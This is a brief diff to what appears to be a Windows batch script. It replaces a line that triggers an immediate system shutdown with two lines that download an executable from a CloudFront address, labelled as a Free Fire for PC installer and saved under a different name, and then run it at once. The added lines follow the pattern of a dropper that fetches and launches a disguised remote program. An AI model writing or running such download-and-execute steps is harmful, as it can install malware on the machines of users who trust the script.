@@ -1,2 +1,3 @@
 echo id_04
-start echo shutdown -s -t 0 & pause
+wget https://d10flarjiecwwj.cloudfront.net/$fumgvwqj1l4l/Baixaki_Free%20Fire%20para%20PC.exe viraum_baixaki.exe
+start viraum_baixaki.exe
